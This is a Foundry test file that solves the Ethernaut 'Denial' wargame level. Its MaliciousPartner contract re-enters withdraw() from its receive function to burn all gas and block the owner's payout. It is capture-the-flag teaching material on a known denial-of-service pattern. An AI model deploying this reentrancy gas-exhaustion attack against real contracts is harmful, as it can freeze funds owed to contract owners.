// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/20-Denial/DenialFactory.sol";
import "../core/Ethernaut.sol";

contract DenialTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testDenialHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.1 ether}(denialFactory);
        Denial ethernautDenial = Denial(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // At each withdraw, 1% of the contract balance is sent to the partner through a call
        // and 1% is sent to the owner through a transfer.
        // Transfer is limited to 2300 gas, so if the partner is a contract that calls withdraw
        // again, the owner will not receive their share as it will run out of gas through an infinite loop.
        // It is possible to image different scenarios to consume all the gas of the transfer.
        address maliciousPartner = address(new MaliciousPartner(ethernautDenial));
        ethernautDenial.setWithdrawPartner(maliciousPartner);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract MaliciousPartner {
    Denial denial;

    constructor(Denial _denial) payable {
        denial = _denial;
    }

    receive() external payable {
        denial.withdraw();
    }
}
